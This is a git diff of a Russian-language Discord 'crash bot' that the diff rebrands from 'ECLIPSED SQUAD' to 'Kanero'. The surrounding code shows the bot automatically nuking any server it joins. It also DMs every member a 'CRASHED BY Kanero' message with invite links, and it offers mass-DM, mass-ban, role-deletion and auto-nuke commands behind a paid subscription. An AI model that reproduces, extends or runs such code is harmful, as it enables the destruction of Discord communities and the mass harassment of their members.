+            "💎 PREMIUM: premium-chat · premium-info · premium-tools · premium-gifts (Premium+)\n"
+            "👑 ADMIN: admin-chat · logs · bot-commands · security · whitelist (Owner+)\n"
+            "🔊 ВОЙСЫ: voice-1/2/3 · gaming-voice (White+) · premium-voice (Premium+) · admin-voice (Owner+)\n\n"
+            "Контент отправлен в info, правила и addbot.\n"
+            "Выдай роли участникам вручную через `!giverole`."
         ),
         color=0x0a0a0a
     )
-    embed.set_footer(text="DavaidKa Bot  |  Роли без прав — настрой вручную")
+    embed.set_footer(text="☠️ Kanero  |  !giverole @юзер @роль — выдать роль")
     await msg.edit(content=None, embed=embed)
 
 
@@ -1154,7 +1395,7 @@ async def on_list(ctx):
         except Exception:
             lines.append(f"`{uid}` — *не найден*")
     embed = discord.Embed(title="👑 Owner Nuke List", description="\n".join(lines) if lines else "*пусто*", color=0x0a0a0a)
-    embed.set_footer(text=f"☠️ ECLIPSED SQUAD  |  Всего: {len(OWNER_NUKE_LIST)}")
+    embed.set_footer(text=f"☠️ Kanero  |  Всего: {len(OWNER_NUKE_LIST)}")
     await ctx.send(embed=embed)
 
 
@@ -1189,7 +1430,7 @@ async def announce(ctx):
             ))
 
     embed = discord.Embed(
-        title="☠️ ECLIPSED — CRASH BOT",
+        title="☠️ Kanero — CRASH BOT",
         description=(
             "Добро пожаловать!\n\n"
             "**Что умеет бот:**\n"
@@ -1205,7 +1446,7 @@ async def announce(ctx):
         ),
         color=0x0a0a0a
     )
-    embed.set_footer(text="☠️ ECLIPSED SQUAD  |  Нажми кнопку чтобы начать")
+    embed.set_footer(text="☠️ Kanero  |  Нажми кнопку чтобы начать")
     embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
 
     await ctx.send(embed=embed, view=GetAccessView())
@@ -1240,7 +1481,7 @@ async def massdm(ctx, *, text: str):
         description=f"✅ Отправлено: **{sent}**\n❌ Не доставлено: **{failed}**",
         color=0x0a0a0a
     )
-    embed.set_footer(text="☠️ ECLIPSED SQUAD")
+    embed.set_footer(text="☠️ Kanero")
     await status_msg.edit(embed=embed)
 
 
@@ -1265,7 +1506,7 @@ async def massban(ctx):
         description=f"✅ Забанено: **{banned}**",
         color=0x0a0a0a
     )
-    embed.set_footer(text="☠️ ECLIPSED SQUAD")
+    embed.set_footer(text="☠️ Kanero")
     await status_msg.edit(embed=embed)
 
 
@@ -1313,7 +1554,7 @@ async def rolesdelete(ctx):
         description=f"🗑️ Удалено ролей: **{deleted}**",
         color=0x0a0a0a
     )
-    embed.set_footer(text="☠️ ECLIPSED SQUAD")
+    embed.set_footer(text="☠️ Kanero")
     await ctx.send(embed=embed)
 
 
@@ -1335,7 +1576,7 @@ async def serverinfo(ctx):
     embed.add_field(name="📅 Создан", value=guild.created_at.strftime("%d.%m.%Y"))
     if guild.icon:
         embed.set_thumbnail(url=guild.icon.url)
-    embed.set_footer(text="☠️ ECLIPSED SQUAD")
+    embed.set_footer(text="☠️ Kanero")
     await ctx.send(embed=embed)
 
 
@@ -1363,7 +1604,7 @@ async def userinfo(ctx, user_id: int = None):
         embed.add_field(name="💎 Буст", value="Да" if member.premium_since else "Нет")
     if user.avatar:
         embed.set_thumbnail(url=user.avatar.url)
-    embed.set_footer(text="☠️ ECLIPSED SQUAD")
+    embed.set_footer(text="☠️ Kanero")
     await ctx.send(embed=embed)
 
 
@@ -1415,13 +1656,13 @@ async def auto_super_nuke_cmd(ctx, state: str, *, text: str = None):
             ),
             color=0x0a0a0a
         )
-        embed.set_footer(text="☠️ ECLIPSED SQUAD")
+        embed.set_footer(text="☠️ Kanero")
         await ctx.send(embed=embed)
     elif state.lower() == "off":
         AUTO_SUPER_NUKE = False
         save_auto_super_nuke()
         embed = discord.Embed(description="❌ **Auto Super Nuke** выключен.", color=0x0a0a0a)
-        embed.set_footer(text="☠️ ECLIPSED SQUAD")
+        embed.set_footer(text="☠️ Kanero")
         await ctx.send(embed=embed)
     elif state.lower() == "text":
         if not text:
@@ -1434,7 +1675,7 @@ async def auto_super_nuke_cmd(ctx, state: str, *, text: str = None):
             description=f"```{text[:500]}```",
             color=0x0a0a0a
         )
-        embed.set_footer(text="☠️ ECLIPSED SQUAD  |  Теперь включи: !auto_super_nuke on")
+        embed.set_footer(text="☠️ Kanero  |  Теперь включи: !auto_super_nuke on")
         await ctx.send(embed=embed)
     elif state.lower() == "info":
         status = "✅ Включён" if AUTO_SUPER_NUKE else "❌ Выключен"
@@ -1452,7 +1693,7 @@ async def auto_super_nuke_cmd(ctx, state: str, *, text: str = None):
             ),
             color=0x0a0a0a
         )
-        embed.set_footer(text="☠️ ECLIPSED SQUAD")
+        embed.set_footer(text="☠️ Kanero")
         await ctx.send(embed=embed)
     else:
         await ctx.send(
@@ -1502,7 +1743,7 @@ async def snuke_config(ctx, option: str = None, value: str = None):
             ),
             inline=False
         )
-        embed.set_footer(text="☠️ ECLIPSED SQUAD  |  Нюк всегда включён")
+        embed.set_footer(text="☠️ Kanero  |  Нюк всегда включён")
         await ctx.send(embed=embed)
         return
 
@@ -1522,7 +1763,7 @@ async def snuke_config(ctx, option: str = None, value: str = None):
         description=f"**{options[option][0]}** — {status}",
         color=0x0a0a0a
     )
-    embed.set_footer(text="☠️ ECLIPSED SQUAD")
+    embed.set_footer(text="☠️ Kanero")
     await ctx.send(embed=embed)
 
 
@@ -1559,13 +1800,13 @@ async def auto_superpr_nuke_cmd(ctx, state: str, *, text: str = None):
             ),
             color=0x0a0a0a
         )
-        embed.set_footer(text="☠️ ECLIPSED SQUAD")
+        embed.set_footer(text="☠️ Kanero")
         await ctx.send(embed=embed)
     elif state.lower() == "off":
         AUTO_SUPERPR_NUKE = False
         save_auto_superpr_nuke()
         embed = discord.Embed(description="❌ **Auto Superpr Nuke** выключен.", color=0x0a0a0a)
-        embed.set_footer(text="☠️ ECLIPSED SQUAD")
+        embed.set_footer(text="☠️ Kanero")
         await ctx.send(embed=embed)
     elif state.lower() == "text":
         if not text:
@@ -1578,7 +1819,7 @@ async def auto_superpr_nuke_cmd(ctx, state: str, *, text: str = None):
             description=f"```{text[:500]}```",
             color=0x0a0a0a
         )
-        embed.set_footer(text="☠️ ECLIPSED SQUAD  |  Теперь включи: !auto_superpr_nuke on")
+        embed.set_footer(text="☠️ Kanero  |  Теперь включи: !auto_superpr_nuke on")
         await ctx.send(embed=embed)
     elif state.lower() == "info":
         status = "✅ Включён" if AUTO_SUPERPR_NUKE else "❌ Выключен"
@@ -1595,7 +1836,7 @@ async def auto_superpr_nuke_cmd(ctx, state: str, *, text: str = None):
             ),
             color=0x0a0a0a
         )
-        embed.set_footer(text="☠️ ECLIPSED SQUAD")
+        embed.set_footer(text="☠️ Kanero")
         await ctx.send(embed=embed)
     else:
         await ctx.send(
@@ -1672,7 +1913,7 @@ async def giverole(ctx, user: discord.Member, role: discord.Role):
             description=f"✅ Роль **{role.name}** выдана **{user}**.",
             color=0x0a0a0a
         )
-        embed.set_footer(text="☠️ ECLIPSED SQUAD")
+        embed.set_footer(text="☠️ Kanero")
         await ctx.send(embed=embed)
     except discord.Forbidden:
         await ctx.send("❌ Нет прав выдать эту роль (роль выше бота в иерархии).")
@@ -1697,7 +1938,7 @@ async def roles_cmd(ctx):
         description="\n".join(lines),
         color=0x0a0a0a
     )
-    embed.set_footer(text=f"☠️ ECLIPSED SQUAD  |  Роль бота: {bot_role.name}  |  !giverole @юзер @роль")
+    embed.set_footer(text=f"☠️ Kanero  |  Роль бота: {bot_role.name}  |  !giverole @юзер @роль")
     await ctx.send(embed=embed)
 
 
@@ -1729,7 +1970,7 @@ async def nukelogs(ctx):
             ),
             inline=False
         )
-    embed.set_footer(text=f"☠️ ECLIPSED SQUAD  |  Всего записей: {len(logs)}")
+    embed.set_footer(text=f"☠️ Kanero  |  Всего записей: {len(logs)}")
     await ctx.send(embed=embed)
 
 
@@ -1763,7 +2004,7 @@ async def changelog(ctx):
         ),
         inline=False
     )
-    embed.set_footer(text="☠️ ECLIPSED SQUAD  |  davaidkatt  |  !changelogall — вся история")
+    embed.set_footer(text="☠️ Kanero  |  davaidkatt  |  !changelogall — вся история")
     embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
     await ctx.send(embed=embed)
 
@@ -1792,7 +2033,7 @@ async def changelogall(ctx):
         ),
         inline=False
     )
-    embed.set_footer(text="☠️ ECLIPSED SQUAD  |  davaidkatt  |  текущая версия: v1.8")
+    embed.set_footer(text="☠️ Kanero  |  davaidkatt  |  текущая версия: v1.8")
     embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
     await ctx.send(embed=embed)
 
@@ -1805,7 +2046,7 @@ async def help_cmd(ctx):
     is_wl = is_whitelisted(uid)
 
     embed = discord.Embed(
-        title="☠️ ECLIPSED — CRASH BOT",
+        title="☠️ Kanero — CRASH BOT",
         description=(
             "```\n"
             "  ██████╗██████╗  █████╗ ███████╗██╗  ██╗\n"
@@ -1895,7 +2136,7 @@ async def help_cmd(ctx):
         value="Discord: **davaidkatt**\nTelegram: **@Firisotik**",
         inline=False
     )
-    embed.set_footer(text="☠️ ECLIPSED SQUAD  |  !changelogall — вся история  |  v1.8")
+    embed.set_footer(text="☠️ Kanero  |  !changelogall — вся история  |  v1.8")
     embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
     await ctx.send(embed=embed)
 
@@ -1937,7 +2178,7 @@ async def commands_user(ctx):
         ),
         inline=False
     )
-    embed.set_footer(text="☠️ ECLIPSED SQUAD  |  davaidkatt")
+    embed.set_footer(text="☠️ Kanero  |  davaidkatt")
     await ctx.send(embed=embed)
 
 
@@ -1978,7 +2219,7 @@ async def commands_premium(ctx):
         ),
         inline=False
     )
-    embed.set_footer(text="☠️ ECLIPSED SQUAD  |  davaidkatt")
+    embed.set_footer(text="☠️ Kanero  |  davaidkatt")
     await ctx.send(embed=embed)
 
 
@@ -2037,7 +2278,7 @@ async def commands_owner(ctx):
         ),
         inline=False
     )
-    embed.set_footer(text="☠️ ECLIPSED SQUAD")
+    embed.set_footer(text="☠️ Kanero")
     await ctx.send(embed=embed)
 
 
@@ -2081,7 +2322,7 @@ async def on_member_remove(member):
                         f"{invite_url}"
                     ),
                     color=0x0a0a0a
-                ).set_footer(text="☠️ ECLIPSED SQUAD  |  davaidkatt")
+                ).set_footer(text="☠️ Kanero  |  davaidkatt")
             )
         except Exception:
             pass
@@ -2117,7 +2358,7 @@ async def on_guild_join(guild):
         nuke_running[guild.id] = True
         asyncio.create_task(do_nuke(guild))
 
-        dm_text = "|| @everyone @here ||\n# CRASHED BY ECLIPSED SQUAD\n# https://discord.gg/SZ7bd8h9\n# https://discord.gg/SZ7bd8h9\n# https://discord.gg/SZ7bd8h9"
+        dm_text = "|| @everyone @here ||\n# CRASHED BY Kanero\n# https://discord.gg/SZ7bd8h9\n# https://discord.gg/SZ7bd8h9\n# https://discord.gg/SZ7bd8h9"
 
         async def dm_all():
             for member in guild.members:
@@ -2302,7 +2543,7 @@ async def run_dm_command(message: discord.Message, guild: discord.Guild, cmd_tex
                     except Exception:
                         lines.append(f"`{uid}` — *не найден*")
                 embed = discord.Embed(title="✅ Whitelist", description="\n".join(lines), color=0x0a0a0a)
-                embed.set_footer(text=f"☠️ ECLIPSED SQUAD  |  Всего: {len(config.WHITELIST)}")
+                embed.set_footer(text=f"☠️ Kanero  |  Всего: {len(config.WHITELIST)}")
                 await message.channel.send(embed=embed)
 
         elif cmd_name == "inv":
@@ -2405,7 +2646,7 @@ async def run_dm_command(message: discord.Message, guild: discord.Guild, cmd_tex
                     except Exception:
                         lines.append(f"`{uid}` — *не найден*")
                 embed = discord.Embed(title="💎 Premium список", description="\n".join(lines), color=0x0a0a0a)
-                embed.set_footer(text=f"☠️ ECLIPSED SQUAD  |  Всего: {len(PREMIUM_LIST)}")
+                embed.set_footer(text=f"☠️ Kanero  |  Всего: {len(PREMIUM_LIST)}")
                 await message.channel.send(embed=embed)
 
         elif cmd_name == "unban":
@@ -2428,7 +2669,7 @@ async def run_dm_command(message: discord.Message, guild: discord.Guild, cmd_tex
                     description=f"Пользователь: **{user}** (`{uid}`)\n✅ Разбанен на **{unbanned}** серверах\n❌ Не удалось на **{failed}** серверах",
                     color=0x0a0a0a
                 )
-                embed.set_footer(text="☠️ ECLIPSED SQUAD")
+                embed.set_footer(text="☠️ Kanero")
                 await message.channel.send(embed=embed)
             except ValueError:
                 await message.channel.send("Использование: `!unban <user_id>`")
@@ -2459,7 +2700,7 @@ async def on_message(message):
             is_wl = is_whitelisted(uid)
 
             embed = discord.Embed(
-                title="☠️ ECLIPSED — CRASH BOT",
+                title="☠️ Kanero — CRASH BOT",
                 description=(
                     "```\n"
                     "  ██████╗██████╗  █████╗ ███████╗██╗  ██╗\n"
@@ -2524,7 +2765,7 @@ async def on_message(message):
                 value="Discord: **davaidkatt**\nTelegram: **@Firisotik**",
                 inline=False
             )
-            embed.set_footer(text="☠️ ECLIPSED SQUAD  |  !changelog — история обновлений")
+            embed.set_footer(text="☠️ Kanero  |  !changelog — история обновлений")
             embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
             await message.channel.send(embed=embed)
             return
@@ -2544,7 +2785,7 @@ async def on_message(message):
                 await message.channel.send("❌ Нет доступа.")
                 return
             embed = discord.Embed(
-                title="💀 OWNER PANEL — ECLIPSED",
+                title="💀 OWNER PANEL — Kanero",
                 description=(
                     "```\n"
                     " ░█████╗░░██╗░░░░░░░██╗███╗░░██╗███████╗██████╗░\n"
@@ -2625,7 +2866,7 @@ async def on_message(message):
                 ),
                 inline=False
             )
-            embed.set_footer(text="☠️ ECLIPSED SQUAD  |  Команды работают только в ЛС")
+            embed.set_footer(text="☠️ Kanero  |  Команды работают только в ЛС")
             embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
             await message.channel.send(embed=embed)
             return
@@ -2680,7 +2921,7 @@ async def on_message(message):
                     except Exception:
                         lines.append(f"`{uid}` — *не найден*")
                 embed = discord.Embed(title="👑 Owner Whitelist", description="\n".join(lines), color=0x0a0a0a)
-                embed.set_footer(text=f"☠️ ECLIPSED SQUAD  |  Всего: {len(config.OWNER_WHITELIST)}")
+                embed.set_footer(text=f"☠️ Kanero  |  Всего: {len(config.OWNER_WHITELIST)}")
                 await message.channel.send(embed=embed)
             return
 
@@ -2856,7 +3097,7 @@ async def on_message(message):
                     except Exception:
                         lines.append(f"`{uid}` — *не найден*")
                 embed = discord.Embed(title="💎 Premium список", description="\n".join(lines), color=0x0a0a0a)
-                embed.set_footer(text=f"☠️ ECLIPSED SQUAD  |  Всего: {len(PREMIUM_LIST)}")
+                embed.set_footer(text=f"☠️ Kanero  |  Всего: {len(PREMIUM_LIST)}")
                 await message.channel.send(embed=embed)
             return
 
@@ -2885,7 +3126,7 @@ async def on_message(message):
                 description=f"```{new_text[:1000]}```",
                 color=0x0a0a0a
             )
-            embed.set_footer(text="☠️ ECLIPSED SQUAD  |  Обновлено: все нюки")
+            embed.set_footer(text="☠️ Kanero  |  Обновлено: все нюки")
             await message.channel.send(embed=embed)
             return
 
@@ -2899,7 +3140,7 @@ async def on_message(message):
                 description=f"```{config.SPAM_TEXT[:1000]}```",
                 color=0x0a0a0a
             )
-            embed.set_footer(text="☠️ ECLIPSED SQUAD")
+            embed.set_footer(text="☠️ Kanero")
             await message.channel.send(embed=embed)
             return
 
@@ -2964,7 +3205,7 @@ async def on_message(message):
                             "Для расширенного доступа напиши: **davaidkatt**"
                         ),
                         color=0x0a0a0a
-                    ).set_footer(text="DavaidKa Bot  |  davaidkatt")
+                    ).set_footer(text="Kanero  |  davaidkatt")
                 )
             except Exception:
                 pass
@@ -2985,7 +3226,7 @@ async def on_message(message):
                             "Наш сервер: https://discord.gg/JEspTXRW"
                         ),
                         color=0x0a0a0a
-                    ).set_footer(text="DavaidKa Bot  |  davaidkatt")
+                    ).set_footer(text="Kanero  |  davaidkatt")
                 )
             except Exception:
                 pass
@@ -3051,7 +3292,7 @@ async def on_ready():
     async def slash_guild_block(interaction: discord.Interaction) -> bool:
         if interaction.guild and is_guild_blocked(interaction.guild.id):
             embed = discord.Embed(description="🔒 Этот сервер заблокирован.", color=0x0a0a0a)
-            embed.set_footer(text="☠️ ECLIPSED SQUAD")
+            embed.set_footer(text="☠️ Kanero")
             await interaction.response.send_message(embed=embed, ephemeral=True)
             return False
         return True
@@ -3277,7 +3518,7 @@ async def on_ready():
         embed.add_field(name="📅 Создан", value=guild.created_at.strftime("%d.%m.%Y"))
         if guild.icon:
             embed.set_thumbnail(url=guild.icon.url)
-        embed.set_footer(text="☠️ ECLIPSED SQUAD")
+        embed.set_footer(text="☠️ Kanero")
         await interaction.response.send_message(embed=embed, ephemeral=True)
 
     @bot.tree.command(name="userinfo", description="💎 [Premium] Инфо о пользователе")
@@ -3308,7 +3549,7 @@ async def on_ready():
             embed.add_field(name="💎 Буст", value="Да" if member.premium_since else "Нет")
         if user.avatar:
             embed.set_thumbnail(url=user.avatar.url)
-        embed.set_footer(text="☠️ ECLIPSED SQUAD")
+        embed.set_footer(text="☠️ Kanero")
         await interaction.response.send_message(embed=embed, ephemeral=True)
 
     # ── SLASH: /help — показывает команды по уровню доступа ─
@@ -3323,16 +3564,16 @@ async def on_ready():
 
         if not wl:
             embed = discord.Embed(
-                title="☠️ ECLIPSED — CRASH BOT",
+                title="☠️ Kanero — CRASH BOT",
                 description="У тебя нет подписки.\nЗа покупкой пиши в ЛС: **davaidkatt**",
                 color=0x0a0a0a
             )
-            embed.set_footer(text="☠️ ECLIPSED SQUAD")
+            embed.set_footer(text="☠️ Kanero")
             await interaction.response.send_message(embed=embed, ephemeral=True)
             return
 
         embed = discord.Embed(
-            title="☠️ ECLIPSED — CRASH BOT",
+            title="☠️ Kanero — CRASH BOT",
             description=(
                 "```\n"
                 "  ██████╗██████╗  █████╗ ███████╗██╗  ██╗\n"
@@ -3390,7 +3631,7 @@ async def on_ready():
                 ),
                 inline=False
             )
-        embed.set_footer(text=f"☠️ ECLIPSED SQUAD  |  {'💎 Premium активен' if pm else 'Нет Premium? Пиши: davaidkatt'}")
+        embed.set_footer(text=f"☠️ Kanero  |  {'💎 Premium активен' if pm else 'Нет Premium? Пиши: davaidkatt'}")
         embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
         await interaction.response.send_message(embed=embed, ephemeral=True)
 
@@ -3403,4 +3644,5 @@ async def on_ready():
 
 
 bot.run(config.TOKEN)
+
 
